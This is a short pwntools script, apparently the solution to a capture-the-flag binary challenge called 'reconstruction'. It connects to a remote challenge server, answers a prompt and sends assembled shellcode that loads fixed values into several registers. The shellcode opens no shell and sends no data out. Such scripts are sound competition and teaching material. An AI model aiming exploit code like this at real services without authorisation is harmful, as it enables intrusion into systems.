from pwn import *

gs = '''
b *check+319
continue
'''

elf = context.binary = ELF("./reconstruction")

def start():
    if args.REMOTE:
        return remote("94.237.62.141", 58104)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

payload = asm(
    """
        mov r8, 0x1337c0de
        mov r9, 0xdeadbeef
        mov r10, 0xdead1337
        mov r12, 0x1337cafe
        mov r13, 0xbeefc0de
        mov r14, 0x13371337
        mov r15, 0x1337dead
        ret
    """
)

io.sendlineafter('[*] If you intend to fix them, type "fix": ', "fix")

io.sendafter("[!] Carefully place all the components: ", payload)

io.interactive()